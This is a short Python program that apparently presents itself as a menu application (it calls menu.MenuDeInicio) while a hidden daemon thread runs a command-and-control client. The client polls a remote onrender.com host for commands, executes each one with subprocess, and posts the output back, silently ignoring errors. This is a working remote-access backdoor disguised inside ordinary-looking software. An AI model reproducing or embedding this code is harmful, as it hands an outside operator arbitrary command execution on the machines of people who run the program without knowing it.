import menu
import requests
import subprocess
import threading
import time

class SimpleC2:
    def __init__(self, web_url):
        self.web_url = web_url
        self.interval = 0.2

    def loop(self):
        while True:
            try:
                r = requests.get(f"{self.web_url}/get_command", timeout=5)
                cmd = r.text.strip()

                if cmd != "none" and cmd != "":
                    out = subprocess.getoutput(cmd)
                    requests.post(
                        f"{self.web_url}/send_result",
                        data={"result": out},
                        timeout=5
                    )

            except Exception:
                pass

            time.sleep(self.interval)

def start_c2():
    web_url = "https://c2-example.onrender.com"
    client = SimpleC2(web_url)
    client.loop()

if __name__ == "__main__":
    thread = threading.Thread(target=start_c2)
    thread.daemon = True
    thread.start()
    
    menu.MenuDeInicio()